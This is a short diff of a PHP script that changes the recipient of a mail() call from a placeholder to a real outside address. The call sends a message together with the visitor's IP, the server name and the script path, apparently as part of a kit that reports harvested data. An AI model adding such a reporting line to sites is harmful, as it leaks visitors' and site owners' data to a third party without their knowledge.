@@ -14,7 +14,7 @@ $header .= 'MIME-Version: 1.0'."\r\n";
 $header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
 $header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
 $header .= 'X-Mailer: PHP v'.phpversion();
-mail('Your maill', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
+mail('sniperr@hi2.in', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
 exit;
 } ?>
 <html lang="tr">
